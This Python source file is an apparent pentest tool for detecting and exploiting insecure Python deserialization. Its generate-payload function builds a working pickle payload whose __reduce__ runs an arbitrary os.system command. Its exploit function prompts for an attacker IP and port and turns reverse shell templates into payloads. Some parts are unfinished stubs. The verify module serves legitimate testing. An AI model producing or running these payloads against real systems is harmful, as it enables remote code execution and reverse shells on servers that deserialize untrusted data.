import argparse
import base64
import os
import pickle
import pickletools

import utils
from utils import *

g_args = None

def parse_args():

    # create parent parser
    # parses arguments that can be used with every of the four basic functionalities
    parent_parser = argparse.ArgumentParser(description=' [+] Tool for identification and exploitation of insecure deserialization vulnerabilities in python')

    # each of the four basic functionalities uses its own subparser to manage arguments
    subparsers = parent_parser.add_subparsers(dest='subparser_name')

    # create the parser for the verify functionality
    verify_parser = subparsers.add_parser('verify', help="Verify that the string is base64 serialized python object")
    # verify_parser.set_defaults(subcommand='verify')
    verify_parser.add_argument('--object', required=True, help="Object to verify(base64?)")
    verify_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
    verify_parser.add_argument('--unsafe', required=False, action='store_true',
                               help='Use dangerous deserialization functions to verify if the string is serialized object.'
                                     'Dangerous! Should only be used when sure the provided object is safe to deserialize.')

    # create the parser for the generate-payload functionality
    generate_payload_parser = subparsers.add_parser('generate-payload', help="Generate serialized object with custom code")
    generate_payload_parser.add_argument('--cmd', required=False, help='cmd')
    generate_payload_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])
    generate_payload_parser.add_argument('--object', required=False, help="Create payload by appending desired code to the already existing pickle object")

    # create the parser for the confirm-vuln functionality
    confirm_vuln_parser = subparsers.add_parser('confirm-vuln', help="Test to confirm existence of vulnerability")
    confirm_vuln_parser.add_argument('-r', '--request', required=True, help="Path to a file containing HTTP request in format used in Burp")
    confirm_vuln_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to confirm vulnerability")
    confirm_vuln_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
    confirm_vuln_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])

    # create the parser for the exploit functionality
    exploit_parser = subparsers.add_parser('exploit', help="Try to exploit the vulnerability and execute reverse shell.")
    exploit_parser.add_argument('-r', '--request', required=True, help="Path to a file containing HTTP request in format used in Burp")
    exploit_parser.add_argument('-p', '--proxy', required=False, help="Use HTTP/HTTPS proxy when issuing request to exploit vulnerability")
    exploit_parser.add_argument("-m", "--marker", required=False, help="Custom marker for injection point in request file. By default the marker is '*'")
    exploit_parser.add_argument("--lib", required=False, help="Use tool for specific serialization library: [picle, pyyaml]", choices=['pickle', 'pyyaml'])

    # parse the arguments
    parsed_args = parent_parser.parse_args()
    global g_args
    g_args = parsed_args

    if parsed_args.subparser_name == 'verify':
        verify()
    elif parsed_args.subparser_name == 'generate-payload':
        generate_payload()
    elif parsed_args.subparser_name == 'confirm-vuln':
        confirm_vuln()
    elif parsed_args.subparser_name == 'exploit':
        exploit()
    else:
        parent_parser.print_usage()
        exit(1)


def verify():
    print("[+] Using verify module")

    base64_encoded_object = str(g_args.object)
    pickle_object = None
    try:
        pickle_object = base64.b64decode(base64_encoded_object)
    except Exception:
        print_red("[-] Not valid base64.")
        return False

    confidence = None

    # try to detect base64 encoded pickle object without unpickling
    if not g_args.unsafe:

        # first try to detect only STOP opcode to detect potential pickle object,
        # if the object does not end with STOP opcode no need to test further, object is not a valid pickle
        if pickle_object.endswith(pickle.STOP):
            confidence = "[+] Confidence: Might be pickle object. Ends with pickle STOP opcode"
        else:
            print_red("[-] Not a valid pickle object")
            return False

        # try to verify if provided object is pickle by disassembling it
        # and verifying that it consists only of valid pickle opcodes
        contains_only_pickle_opcodes = True
        try:
            for obj in pickletools.genops(pickle_object):
                opcode_str = obj[0].code
                if not (bytes(opcode_str, 'utf-8')) in [bytes(opcode.code, 'utf-8') for opcode in pickletools.opcodes]:
                    contains_only_pickle_opcodes = False

            if contains_only_pickle_opcodes:
                print_green("[+] Detected pickle object")
                confidence = "[+] Confidence: High"
        except Exception:
            print_red("[-] Not a valid pickle object")
            return False

    # try to deserialize object to verify
    # unsafe!!!
    else:
        print("[+] using --unsafe")
        try:
            pickle.loads(pickle_object)
            print_green("[+] Pickle object detected")
            confidence = "[+] Confidence: Certain"
        except Exception:
            print_red("[-] Not a valid pickle object")
            return False

    print_green(confidence)
    return True




def generate_payload(revshell_cmd=None): # todo: nadodati na postojeci pickle objekt
    print("[+] Using generate-payload module")

    cmd = None

    # if generate_payload is not called from exploit functionality
    # read user provided argument, else use provided revshell_cmd arg
    if not revshell_cmd:
        if g_args.cmd:
            cmd = g_args.cmd
        else:
            cmd = input("[+] Enter your command: ")
    else:
        cmd = revshell_cmd

    class exploit():
        def __init__(self, command):
            self.command = command
        def __reduce__(self):
            return os.system, (self.command,)

    # if called from exploit functionality no need to print payload
    if revshell_cmd is None:
        print("[+] Generating payload ... ")
        print("\t[+] Base64 encoded payload: ", base64.b64encode(pickle.dumps(exploit(cmd))).decode("utf-8"))
        print("\t[+] Raw bytes payload: ", pickle.dumps(exploit(cmd)))
    return base64.b64encode(pickle.dumps(exploit(cmd))).decode("utf-8")



def confirm_vuln():
    print("[+] Using confirm-vuln module")


def exploit():
    print("[+] Using exploit module")

    revshell_ip = input("[+] Enter your ip(LHOST): ")
    revshell_port = input("[+] Enter you (LPORT): ")
    print(f"[+] Starting listener on {revshell_ip}:{revshell_port}")
    #todo

    for rs in utils.reverse_shells:
        rs.replace("ip_placeholder", revshell_ip).replace("port_placeholder", revshell_port).strip()
        payload = generate_payload(revshell_cmd=rs)


def print_banner():
    print(utils.banner)


def print_green(txt):
    print("\033[92m {}\033[00m".format(txt))


def print_red(txt):
    print("\033[91m {}\033[00m".format(txt))


if __name__ == '__main__':
    print_banner()
    parse_args()
